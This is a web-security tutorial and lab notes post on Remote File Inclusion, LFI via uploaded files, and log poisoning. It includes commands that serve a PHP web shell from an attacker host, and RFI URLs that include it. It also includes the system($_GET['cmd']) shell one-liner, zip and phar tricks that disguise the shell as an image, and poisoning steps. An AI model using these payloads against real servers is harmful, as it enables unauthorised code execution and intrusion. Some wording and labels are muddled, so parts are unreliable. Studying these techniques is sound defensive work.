---
title: Remote File Inclusion (RFI)
date: 2024-02-12 20:00 
categories: [File Inclusion]
tags: [SMB, RFI, RCE, PHP, FTP, Reverse Shell]
author: jamarapo
---



Remote File Inclusion (RFI) is an exploitation technique where a vulnerable function allows the inclusion of remote URLs. This can lead to significant security risks, including remote code execution. Here's a detailed overview of RFI and how it can be exploited:

## Introduction
RFI is the ability to include remote files via vulnerable functions.

    While similar to Local File Inclusion (LFI), RFI involves remote URLs.
    Exploiting RFI allows attackers to execute malicious code remotely.

Distinguishing RFI:

    Vulnerable functions like include() in PHP permit RFI if not properly secured.
    RFI vulnerabilities can exist independently or alongside LFI.

Identification and Verification:

    Check for RFI by attempting to include a remote URL.
    Confirm RFI vulnerability by observing successful inclusion of remote content.

## Exploitation Techniques
### HTTP Exploitation:
Start an HTTP server hosting a malicious script. Include the script via a vulnerable RFI endpoint.
      

``` php
    sudo python3 -m http.server <LISTENING_PORT>
    [Include Remote Shell via HTTP]([http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id](http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id))
```
   
### FTP Exploitation
   Host the malicious script via FTP.
    Include the script using the FTP scheme in the URL.

````
    bash

    sudo python -m pyftpdlib -p 21
    [Include Remote Shell via FTP]([ftp://<OUR_IP>/shell.php&cmd=id](ftp://<OUR_IP>/shell.php&cmd=id))
````
### SMB Exploitation
Utilize the SMB protocol, especially effective on Windows servers.
   

``` bash
    impacket-smbserver -smb2support share $(pwd)
```

## Conclusion
RFI vulnerabilities pose serious security threats, enabling attackers to execute arbitrary code remotely. It's essential to understand the risks associated with RFI and implement robust security measures to mitigate these vulnerabilities effectively.


## Lab1

![alt text](/assets/img/posts/RFI/image.png)

![alt text](/assets/img/posts/RFI/image-1.png)

![alt text](/assets/img/posts/RFI/image-2.png)

![alt text](/assets/img/posts/RFI/image-3.png)


File upload functionalities are common in modern web applications, allowing users to upload data for profile configuration and other purposes. However, this feature can be exploited by attackers, especially in conjunction with vulnerabilities like Local File Inclusion (LFI).

The File Upload Attacks module explores various techniques for exploiting file upload functionalities. In this section, we focus on exploiting LFI through file uploads. Even if the file upload form itself is not vulnerable, simply allowing file uploads can enable attackers to execute code if the vulnerable function supports it.

## Key Points

  - Vulnerable functions like include() and include_once() in PHP allow executing code with file inclusion capabilities.
  - Attackers can upload seemingly harmless files, such as images containing PHP web shell code.
  -  Crafting a malicious image involves using allowed image extensions and including image magic bytes at the beginning of the file content to evade checks based on extension and content type.
  - Uploading the malicious image to the web application can potentially lead to remote code execution, especially if combined with an LFI vulnerability.

Important Functions for Code Execution:

    PHP: include(), include_once(), require(), require_once()
    NodeJS: res.render()
    Java: import
    .NET: include

## Crafting Malicious Image

The first step involves creating a malicious image file containing PHP web shell code, disguised as a legitimate image. This involves using an allowed image extension (e.g., .gif) and including image magic bytes at the beginning of the file content.

Note: While GIF images are used in this example due to their ASCII-based magic bytes, this technique can be applied to any allowed image or file type.

Once we have been uploaded an image, we can inspect the code and we expect this 
``` html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

With this URL excutes reverse shell using a GIF file.
```
/index.php?language=./profile_images/shell.gif&cmd=id
```
We can utilize the zip wrapper to execute PHP code. This wrapper not only is activated.

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
We can use phan wrapper to obtain the same result.
```
 <?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```



## Lab 2
![alt text](/assets/img/posts/RFI/image1.png)

![alt text](/assets/img/posts/RFI/image-1-1.png)

![alt text](/assets/img/posts/RFI/image-2-1.png)

In linux to look for .txt files we can use:
```
find / -type f -name "*.txt"
```

![alt text](/assets/img/posts/RFI/image-3-1.png)

## Log poisoning

Log poisoning exploits vulnerabilities in web applications to inject PHP code into log files, leading to the execution of this code when the log files are included. The key concept involves injecting PHP code into fields we control, which is then logged and subsequently executed upon inclusion.


### PHP Session Poisoning

PHP web applications often use PHPSESSID cookies to store user-related data, typically in session files located at /var/lib/php/sessions/ on Linux. By manipulating these session files, we can control and inject PHP code.

    Check PHPSESSID cookie value.
    Include session file through LFI vulnerability.
    Manipulate session data to execute PHP code.
    Write PHP web shell into session file.
    Execute commands via inclusion of session file.

### Server Log Poisoning

Apache and Nginx maintain log files such as access.log, which include details of requests, including the User-Agent header. By poisoning these logs with controlled User-Agent headers, we can execute injected PHP code.

Access and poison logs via LFI vulnerability.
Modify User-Agent header using Burp Suite or cURL.
    Execute commands via inclusion of poisoned logs.
    Consider alternative log locations like /proc/ for additional exploitation opportunities.

Log poisoning extends beyond Apache and Nginx logs, potentially impacting other service logs such as /var/log/sshd.log, /var/log/mail, and /var/log/vsftpd.log. Exploitability depends on read access and the presence of controllable parameters.


## Lab 3

![alt text](/assets/img/posts/RFI/image-5.png)

![alt text](/assets/img/posts/RFI/image-4.png)

![alt text](/assets/img/posts/RFI/image-6.png)

![alt text](/assets/img/posts/RFI/image-8.png)

![alt text](/assets/img/posts/RFI/image-7.png)

![alt text](/assets/img/posts/RFI/image-9.png)

![alt text](/assets/img/posts/RFI/image-10.png)
